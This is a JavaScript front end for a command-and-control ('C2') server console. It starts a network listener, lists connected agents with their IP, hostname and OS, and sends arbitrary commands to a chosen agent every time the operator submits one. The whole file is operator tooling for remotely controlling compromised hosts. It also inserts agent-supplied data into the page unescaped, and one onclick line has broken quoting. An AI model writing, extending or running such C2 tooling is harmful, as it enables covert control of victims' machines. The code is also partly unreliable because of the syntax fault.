// C2 Server — Controls, agent management, console
(function(){
  let clients = [], cmdCount = 0, selectedClient = null;

  const ipInput = document.getElementById('c2-ip');
  const portInput = document.getElementById('c2-port');
  const startBtn = document.getElementById('c2-start-btn');
  const stopBtn = document.getElementById('c2-stop-btn');
  const addrPreview = document.getElementById('c2-addr-preview');

  // Update address preview
  function updatePreview() {
    addrPreview.textContent = (ipInput.value||'0.0.0.0') + ':' + (portInput.value||'9090');
  }
  ipInput.oninput = updatePreview;
  portInput.oninput = updatePreview;

  // Load config on page load
  fetch('/api/c2/config').then(r=>r.json()).then(cfg => {
    ipInput.value = cfg.ip||'0.0.0.0';
    portInput.value = cfg.port||9090;
    updateStatus(cfg.running);
    updatePreview();
  });

  startBtn.onclick = function() {
    const cfg = {ip: ipInput.value, port: parseInt(portInput.value)||9090, running: true};
    fetch('/api/c2/config', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(cfg)})
      .then(r=>r.json()).then(cfg => { updateStatus(cfg.running); logConsole('success','Listener started on '+cfg.ip+':'+cfg.port); });
  };

  stopBtn.onclick = function() {
    fetch('/api/c2/stop').then(r=>r.json()).then(cfg => { updateStatus(false); logConsole('warn','Listener stopped'); });
  };

  function updateStatus(running) {
    startBtn.disabled = running;
    stopBtn.disabled = !running;
    const badge = document.getElementById('c2-status-badge');
    const dot = document.getElementById('c2-status-dot');
    const text = document.getElementById('c2-status-text');
    const cfgStatus = document.getElementById('c2-config-status');
    const listenerAddr = document.getElementById('c2-listener-addr');
    if(running) {
      badge.textContent = 'LISTENING';
      badge.className = 'badge badge-active';
      dot.style.background = 'var(--low)';
      text.textContent = 'Listening';
      cfgStatus.textContent = ipInput.value + ':' + portInput.value;
      cfgStatus.style.color = 'var(--low)';
      listenerAddr.textContent = ':' + portInput.value;
    } else {
      badge.textContent = 'OFFLINE';
      badge.className = 'badge badge-offline';
      dot.style.background = 'var(--critical)';
      text.textContent = 'Offline';
      cfgStatus.textContent = 'Not running';
      cfgStatus.style.color = 'var(--text-dim)';
      listenerAddr.textContent = '—';
    }
  }

  function renderClients() {
    const active = clients.filter(c=>c.status==='active').length;
    const offline = clients.filter(c=>c.status==='offline').length;
    document.getElementById('c2-active').textContent = active;
    document.getElementById('c2-offline').textContent = offline;

    const tbody = document.getElementById('client-table');
    const targetSelect = document.getElementById('c2-target');

    if(!clients.length) {
      tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--text-dim);padding:2rem;">Waiting for agents... Start the listener first.</td></tr>';
      targetSelect.innerHTML = '<option value="">Select agent...</option>';
      return;
    }

    tbody.innerHTML = clients.map(c => '<tr class="client-row" data-id="'+c.id+'">'
      + '<td><code>'+c.id+'</code></td>'
      + '<td><code style="font-size:0.55rem;">'+c.session_id.substring(0,8)+'...</code></td>'
      + '<td>'+c.ip+'</td>'
      + '<td>'+(c.hostname||'—')+'</td>'
      + '<td>'+(c.os||'—')+'</td>'
      + '<td><span class="badge badge-'+(c.status==='active'?'active':'offline')+'">'+c.status+'</span></td>'
      + '<td style="font-size:0.6rem;">'+(c.last_seen?new Date(c.last_seen).toLocaleTimeString():'—')+'</td>'
      + '<td><button class="btn" style="font-size:0.6rem;padding:0.25rem 0.5rem;" onclick="window.c2SelectClient(''+c.id+'')">Select</button></td>'
      + '</tr>').join('');

    targetSelect.innerHTML = '<option value="">Select agent...</option>'
      + clients.filter(c=>c.status==='active').map(c => '<option value="'+c.id+'">'+c.id+' ('+c.ip+')</option>').join('');
  }

  window.c2SelectClient = function(id) {
    selectedClient = id;
    document.getElementById('c2-target').value = id;
    logConsole('info','Selected agent: '+id);
  };

  document.getElementById('c2-target').onchange = function() {
    selectedClient = this.value;
  };

  function logConsole(level, msg) {
    const time = new Date().toLocaleTimeString();
    const consoleDiv = document.getElementById('c2-console');
    consoleDiv.innerHTML += '<div class="console-line"><span class="console-time">['+time+']</span> <span class="console-'+level+'">'+msg+'</span></div>';
    consoleDiv.scrollTop = consoleDiv.scrollHeight;
  }

  document.getElementById('cmd-send').onclick = function() {
    const target = selectedClient || document.getElementById('c2-target').value;
    if(!target) { logConsole('warn','No agent selected'); return; }
    const cmd = document.getElementById('cmd-input').value.trim();
    if(!cmd) return;
    cmdCount++;
    document.getElementById('c2-commands').textContent = cmdCount;
    logConsole('info','['+target+'] &gt; '+cmd);
    document.getElementById('cmd-input').value = '';
    fetch('/api/c2/send', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({client_id:target, command:cmd})})
      .then(r=>r.json()).then(d => logConsole('success','Command sent'))
      .catch(() => logConsole('error','Failed to send'));
  };

  function pollClients() {
    fetch('/api/c2/clients').then(r=>r.json()).then(d => { clients = d; renderClients(); });
  }
  pollClients();
  setInterval(pollClients, 3000);
})();
